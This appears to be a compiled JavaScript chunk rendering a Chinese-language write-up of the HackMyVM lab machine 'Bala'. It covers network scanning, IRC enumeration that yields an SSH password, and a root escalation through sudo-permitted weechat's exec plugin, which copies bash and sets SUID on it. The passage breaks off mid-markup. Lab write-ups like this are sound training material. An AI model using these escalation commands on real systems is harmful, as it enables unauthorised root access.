(window.webpackJsonp=window.webpackJsonp||[]).push([[142],{505:function(s,a,t){"use strict";t.r(a);var n=t(11),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"初始信息侦察"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#初始信息侦察"}},[s._v("#")]),s._v(" 初始信息侦察")]),s._v(" "),a("h3",{attrs:{id:"主机发现与-arp-扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#主机发现与-arp-扫描"}},[s._v("#")]),s._v(" 主机发现与 ARP 扫描")]),s._v(" "),a("p",[s._v("存活主机发现")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/bala"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth1 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.0/24\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.122  08:00:27:19:f1:95       PCS Systemtechnik GmbH\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h3",{attrs:{id:"tcp-全端口扫描与服务识别"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#tcp-全端口扫描与服务识别"}},[s._v("#")]),s._v(" TCP 全端口扫描与服务识别")]),s._v(" "),a("p",[s._v("tcp全端口扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/bala"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.122                                                 \n\nPORT     STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6667")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  irc\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("h3",{attrs:{id:"_80-端口-http-服务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口-http-服务"}},[s._v("#")]),s._v(" 80 端口 HTTP 服务")]),s._v(" "),a("p",[s._v("访问80端口，一个irc通信协议的介绍、快速开始等内容，爆破目录无果，没有发现信息泄露等问题。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/1.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"_6667端口-irc-服务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_6667端口-irc-服务"}},[s._v("#")]),s._v(" 6667端口 irc 服务")]),s._v(" "),a("p",[s._v("nc 连接6667端口，一个 irc 服务器。使用 nc 连接后，发送 NICK 和 USER 命令注册用户，注册后，irc 服务器会返回了fzer, /msg信息")]),s._v(" "),a("p",[s._v("找到一篇 IRC 基本命令文章作为参考，"),a("strong",[a("a",{attrs:{href:"https://blog.csdn.net/ljxkey/article/details/8752649",target:"_blank",rel:"noopener noreferrer"}},[s._v("IRC 基本命令"),a("OutboundLink")],1)]),s._v("  https://blog.csdn.net/ljxkey/article/details/8752649")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/bala"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-nv")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.122 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6667")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("UNKNOWN"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.122"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6667")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ircd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("\n:irc.local NOTICE * :*** Looking up your hostname"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n:irc.local NOTICE * :*** Could not resolve your hostname: Request timed out"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" using your IP address "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.100"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" instead.\nNICK test123\n"),a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("USER")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" * :Test User\n\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("251")]),s._v(" test123 :There are "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("users")]),s._v(" and "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" invisible on "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" servers\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("254")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(" :channels formed\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("265")]),s._v(" test123 :Current "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" users: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("  Max: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("266")]),s._v(" test123 :Current global users: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("  Max: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("372")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" fzer\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("372")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" /msg\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("376")]),s._v(" test123 :End of message of the day.\nPING :irc.local\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("p",[s._v("发现存在4个频道，不允许查看用户列表。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("LIST\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("321")]),s._v(" test123 Channel :Users Name\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("322")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Important 1 :[+nt] ")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("322")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Creds 1 :[+nt] ")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("322")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Team 1 :[+nt] ")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("322")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Chat 1 :[+nt] ")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("323")]),s._v(" test123 :End of channel list.\nUSERS\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("446")]),s._v(" test123 :USERS has been disabled\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("依次进入频道看看，每个频道只有一个用户 bala。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("JOIN "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Important")]),s._v("\n:test123"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("test123@192.168.56.100 JOIN "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Important")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("353")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Important :@bala test123")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("366")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Important :End of /NAMES list.")]),s._v("\nJOIN "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Creds")]),s._v("\n:test123"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("test123@192.168.56.100 JOIN "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Creds")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("353")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Creds :@bala test123")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("366")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Creds :End of /NAMES list.")]),s._v("\nJOIN "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Chat")]),s._v("\n:test123"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("test123@192.168.56.100 JOIN "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Chat")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("353")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Chat :@bala test123")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("366")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Chat :End of /NAMES list.")]),s._v("\nJOIN "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Team")]),s._v("\n:test123"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("test123@192.168.56.100 JOIN "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Team")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("353")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Team :@bala test123")]),s._v("\n:irc.local "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("366")]),s._v(" test123 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Team :End of /NAMES list.")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("h2",{attrs:{id:"ssh-密码登录-fzer-用户"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-密码登录-fzer-用户"}},[s._v("#")]),s._v(" SSH 密码登录 fzer 用户")]),s._v(" "),a("p",[s._v("私聊 bala 用户，爆金币了，给了一个密码")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("PRIVMSG bala :hello\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :未知命令，可用命令: getpassword, help, info\nPRIVMSG bala :getpassword\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :密码: ai01ClGAXoYpeevwNMS1\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :此密码为敏感信息，请妥善保管\nPRIVMSG bala :help\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :可用命令:\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :getpassword - 获取密码\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :help - 显示帮助\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :info - 机器人信息\nPRIVMSG bala :info\nPRIVMSG bala :info\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :Simple IRC Bot v2.0\n:bala"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("bala@127.0.0.1 PRIVMSG test123 :功能: 密码管理、频道通信\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])]),a("p",[s._v("拿密码尝试登录bala用户 ssh，密码不对，或者没有这个用户，后尝试 "),a("code",[s._v("fzer")]),s._v(" 用户成功。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/hackmyvm/bala"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" bala@192.168.56.122              \nbala@192.168.56.122"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'s password: \nPermission denied, please try again.\n┌──(npc㉿kali)-[~/hackmyvm/bala]\n└─$ ssh fzer@192.168.56.122\nfzer@192.168.56.122'")]),s._v("s password: \nLinux Bala "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4.19")]),s._v(".0-27-amd64 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64")]),s._v("\n\nThe programs included with the Debian GNU/Linux system are "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("free")]),s._v(" software"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nthe exact distribution terms "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" each program are described "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" the\nindividual files "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nfzer@Bala:~$ \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-bala/16.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"root-提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#root-提权"}},[s._v("#")]),s._v(" root 提权")]),s._v(" "),a("h3",{attrs:{id:"sudo-权限枚举"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sudo-权限枚举"}},[s._v("#")]),s._v(" sudo 权限枚举")]),s._v(" "),a("p",[s._v("看下当前用户有无sudo命令权限，发现可以运行 /usr/bin/weechat。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("fzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\n\nWe trust you have received the usual lecture from the "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" System\nAdministrator. It usually boils down to these three things:\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1) Respect the privacy of others.")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2) Think before you type.")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#3) With great power comes great responsibility.")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("sudo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" password "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" fzer: \nMatching Defaults entries "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" fzer on Bala:\n    env_reset, mail_badpass, "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("secure_path")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/local/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/local/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/bin\n\nUser fzer may run the following commands on Bala:\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" PASSWD: /usr/bin/weechat\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("h3",{attrs:{id:"weechat-服务提权分析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#weechat-服务提权分析"}},[s._v("#")]),s._v(" weechat 服务提权分析")]),s._v(" "),a("p",[s._v("这是一个irc服务的客户端"),a("a",{attrs:{href:"https://weechat.org/",target:"_blank",rel:"noopener noreferrer"}},[s._v("Weechat"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("使用 sudo 权限运行 weechat。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" /usr/bin/weechat\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("可用插件列表：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("Plugins loaded: alias, buflist, charset, exec, fifo, fset, irc, logger, perl, python, relay, ruby, script, spell, trigger, xfer\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-bala/2.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"方法一-插件提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#方法一-插件提权"}},[s._v("#")]),s._v(" 方法一：插件提权")]),s._v(" "),a("p",[a("strong",[s._v("exec 插件")])]),s._v(" "),a("p",[s._v("使用help命令获取帮助，"),a("code",[s._v("-sh")]),s._v("、"),a("code",[s._v("-n")]),s._v("参数都可以执行命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/3.png",alt:""}})]),s._v(" "),a("blockquote",[a("p",[s._v("SUID（Set User ID）是一种在Linux/Unix系统上赋予文件的特殊权限。它允许普通用户在执行具有该权限的二进制程序时，"),a("strong",[s._v("临时获得该文件所有者的权限")]),s._v("。")])]),s._v(" "),a("p",[s._v("复制一份 root bash 到家目录，添加suid 权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("/exec "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sh")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cp")]),s._v(" /bin/bash /home/fzer/bash1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" u+s /home/fzer/bash1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("执行命令后，使用"),a("code",[s._v("/exit")]),s._v("退出 weechat，验证家目录"),a("code",[s._v("bash1")]),s._v("的suid权限")]),s._v(" "),a("div",{staticClass:"language-bash 